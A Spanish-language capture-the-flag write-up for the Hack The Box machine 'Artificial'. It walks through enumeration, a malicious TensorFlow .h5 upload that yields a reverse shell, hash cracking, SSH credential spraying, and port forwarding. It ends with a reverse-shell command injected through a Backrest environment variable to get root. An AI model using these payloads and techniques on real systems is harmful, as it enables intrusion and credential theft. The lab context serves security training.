# HTB: Artificial

## Host: Linux
## IP: 10.10.11.74

## Procedimiento y comandos
#### Paso 1: Enumeracion

* Nmap

```bash
  cat Artificial-nmap.txt  
# Nmap 7.95 scan initiated Mon Sep  8 15:46:08 2025 as: /usr/lib/nmap/nmap -A -oN Artificial-nmap.txt 10.10.11.74
Nmap scan report for 10.10.11.74
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   162.45 ms 10.10.14.1
2   162.54 ms 10.10.11.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  8 15:46:25 2025 -- 1 IP address (1 host up) scanned in 17.37 seconds
```

* Gobuster

```bash
  gobuster dir -u http://artificial.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k    

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artificial.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
```

* Informacion:

La pagina es un ejecutor y generador de modelos tensorflow. Generamos un registro y luego un login en la pagina, y vemos un formulario de subida de archivos que nos permite subir archivos de tipo **.h5**

Descargamos el archivo requirements.txt y el Dockerfile

> **Importante** respetar la version de tensorflow que indica el .txt de lo contrario no funciona la poc

Encontramos un [exploit](https://github.com/Splinter0/tensorflow-rce)

clonamos el repo, instalamos y configuramos docker

```bash

sudo apt install docker-cli

sudo apt install -y docker.io

sudo systemctl enable --now docker

sudo systemctl status docker --no-pager
```


#### Paso 2: Acceso inicial

1. Ejecutamos el contenedor dentro del repositorio que contiene el exploit modificado con nuestra ip

```bash
  sudo docker run --rm -v $(pwd):/code -w /code python:3.8-slim bash -c "
pip install https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl &&
python exploit.py"
```
Este comando hace varias cosas importantes:

1. `sudo docker run` 

2. `--rm` 
    - Hace que el contenedor se elimine automáticamente cuando termina de ejecutarse

3. `-v $(pwd):/code`
    - Monta la carpeta actual ($(pwd) — pwd devuelve el path actual) dentro del contenedor en /code.
    - Esto significa que todo lo que haya en la carpeta local (por ejemplo exploit.py) es accesible desde /code dentro del contenedor. En este caso el repo del exploit.
    - También permite que los archivos que genermos dentro del contenedor (por ejemplo exploit.h5) aparezcan en la carpeta local.
4. `-w /code`
    - Establece el working directory dentro del contenedor en /code.
    - Todos los comandos que se ejecuten a continuación correrán desde /code.
5. `python:3.8-slim`
    - Es la imagen base que usa Docker para este contenedor.
    - Contiene Python 3.8 y un sistema base minimalista (slim).
    - No contiene TensorFlow ni otras librerías; por eso lo instalamos en el siguiente paso.
6. `bash -c "..."`
    - Le dice al contenedor que ejecute un comando Bash.
    - Todo lo que esté entre comillas se ejecuta como un mini-script dentro del contenedor.
```bash
pip install https://files.pythonhosted.org/.../tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl &&
python exploit.py
```
7. `pip install <tensorflow.whl>`
   - Descarga e instala TensorFlow CPU 2.13.1 desde el archivo .whl específico para Python 3.8.
   - Es equivalente a hacer `pip install tensorflow==2.13.1` pero usando el wheel directamente.
   - Esto prepara el contenedor para ejecutar el script que depende de TensorFlow.

8. `&& python exploit.py` 
  - Compila el exploit.h5 para subir 

* Subimos el archivo y hacemos click en el boton "View Predictions" que ejecuta el .h5 malicioso

* Receptor

```bash
  nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.74] 41278
/bin/sh: 0: can't access tty; job control turned off
$ 
```

#### Movimiento lateral / escalada de privilegios

1. Buscamos archivos de interes, looteamos users.db

```bash
$ whoami
app
$ ls -la
total 36
drwxrwxr-x 7 app app 4096 Jun  9 13:56 .
drwxr-x--- 6 app app 4096 Jun  9 10:52 ..
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
drwxr-xr-x 2 app app 4096 Sep  9 23:03 instance
drwxrwxr-x 2 app app 4096 Sep  9 23:10 models
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
$ ls static
css
Dockerfile
js
requirements.txt
$ ls instance
users.db
$ python3 -m http.server 8000
```

* loot desde kali

```bash
  wget http://10.10.11.74:8000/instance/users.db                     
--2025-09-09 20:23:31--  http://10.10.11.74:8000/instance/users.db
Connecting to 10.10.11.74:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24576 (24K) [application/octet-stream]
Saving to: ‘users.db’

users.db                  100%[=====================================>]  24.00K   117KB/s    in 0.2s    

2025-09-09 20:23:32 (117 KB/s) - ‘users.db’ saved [24576/24576]

```
2. Dump de usuarios:

```bash
  sqlite3 users.db                                                              
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
model  user 
sqlite> SELECT * FROM user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|admin|admin@mail.ru|21232f297a57a5a743894a0e4a801fc3
7|david|david@outlook.com|172522ec1028ab781d9dfd17eaca4427
8|davido|dm@outlook.com|68116ce0ae62cb8d421a1d749ec0496f
9|test|test@test.htb|444bcb3a3fcf8389296c49467f27e1d6
10|attacker|attacker@attacker.com|5f4dcc3b5aa765d61d8327deb882cf99
11|oxygen@gmail.com|abc@123|b24331b1a138cde62aa1f679164fc62f
12|oxygen|oxygen@gmail.com|b24331b1a138cde62aa1f679164fc62f
13|Jo|terrypari34@gmail.com|a9e6a432530d917bfb98ccf1ce748cd3
14|duckman|duckman@doom.com|187aa86997040177d240ee764ace4a58
15|amine|amine2222@gmail.com|30d2310007b75bf0180f5ed831f20fdb
sqlite> 
```
3. Usamos Crackstation para decodificar los hashes, generamos una lista de usuarios y otra lista de passwords, para propagar credenciales sobre ssh.

```bash
  nxc ssh 10.10.11.74 -u users.txt -p passwords.txt
SSH         10.10.11.74     22     10.10.11.74      [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
SSH         10.10.11.74     22     10.10.11.74      [+] gael:mattp005numbertwo  Linux - Shell access!
```

4. Entramos como **Gael**

```bash
  ssh gael@10.10.11.74

gael@artificial:~$ 
```

* Obtenemos el flag user.txt

```bash
gael@artificial:~$ cat user.txt
7c000253e59976f67a0f71a6b69e8b5a
```
#### Escalamos privilegios

1. Luego de ejecutar linpeas notamos dos cosas

* El usuario gael pertenece al grupo sysadm
* Tenemos accesos a un archivo que parece ser un backup

```bash
gael@artificial:~$ ls -la /var/backups/
total 51228
drwxr-xr-x  2 root root       4096 Sep  9 11:00 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4  2025 backrest_backup.tar.gz
gael@artificial:~$ groups
gael sysadm
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
gael@artificial:~$ 
```

2. Looteamos el archivo y lo descomprimimos:

```bash
  7z x backrest_backup.tar.gz              

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 52357120 bytes (50 MiB)

Extracting archive: backrest_backup.tar.gz
WARNING:
backrest_backup.tar.gz
Cannot open the file as [gzip] archive
The file is open as [tar] archive

--
Path = backrest_backup.tar.gz
Open WARNING: Cannot open the file as [gzip] archive
Type = tar
Physical Size = 52357120
Headers Size = 10752
Code Page = UTF-8
Characteristics = GNU ASCII

Everything is Ok

Archives with Warnings: 1
Folders: 6
Files: 13
Size:       52344483
Compressed: 52357120
```
3. Inspeccionamos y encontramos un directorio oculto **.config** con cosas interesantes dentro

```bash
  cat .config/backrest/config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```
* El password parece ser un base64 lo pasamos por [boxentriq](https://www.boxentriq.com/code-breaking/base64-decoder)

Obtenemos un hash: `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO` 

* Lo identificamos con [hashes](https://hashes.com/en/tools/hash_identifier)

* Buscamos el modo con hashcat:

```bash
  hashcat -h | grep -i "bcrypt"                                                                                      
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

* Guardamos el hash

```bash
  echo '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' > backrest_root.hash

```

* Crackeamos

```bash
  hashcat -m 3200 backrest_root.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO
Time.Started.....: Tue Sep  9 23:17:52 2025 (3 mins, 0 secs)
Time.Estimated...: Tue Sep  9 23:20:52 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       30 H/s (7.96ms) @ Accel:8 Loops:4 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5376/14344385 (0.04%)
Rejected.........: 0/5376 (0.00%)
Restore.Point....: 5312/14344385 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1020-1024
Candidate.Engine.: Device Generator
Candidates.#1....: baby06 -> ginuwine
Hardware.Mon.#1..: Temp: 69c Util: 91%

Started: Tue Sep  9 23:16:18 2025
Stopped: Tue Sep  9 23:20:54 2025
```

* Password: ** !@#$%^ **

> Al propagar las nuevas credenciales por ssh no conseguimos nada, volvemos a enumerar el host con el usuario gael

```bash
gael@artificial:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
```
* Podemos ver un par de servidores locales en ejecucion en los puertos 9898 y 5000, adicionalmente algunos de los archivos que descargamos del backrest senalaron el puerto 9898

#### ssh Port forwarding

```bash
  ssh -L 8000:127.0.0.1:9898 -N -f gael@10.10.11.74
gael@10.10.11.74's password: mattp005numbertwo
```
Luego en el navegador podemos entrar a 127.0.0.1:8000 y tener acceso al servidor local. Al entrar vemos un formulario de login colocamos las credenciales de backrest_root.
En este punto nos encontramos con un panel administrativo que se encarga de los backups como si fuera un cms.

1. Creamos un repo y en el input de variables de entorno configuramos la variable **`RESTIC_PASSWORD_COMMAND=bash -c "bash -i >& /dev/tcp/10.10.14.218/4444 0>&1"`**

> El resto de las variables no son reelevantes.. se llenan las obligatorias 

2. Con el receptor activo en el puerto 4444 clickeamos en el button submit y obtenemos el reverse shell como root.

```bash
  nc -lvnp 4444                                    
listening on [any] 4444 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.74] 52262
bash: cannot set terminal process group (56415): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/# cat /root/root.txt
cat /root/root.txt
c2ea4cc910db9a8251b0619a94a3bfa4
root@artificial:/# whoami
whoami
root
root@artificial:/# 
```
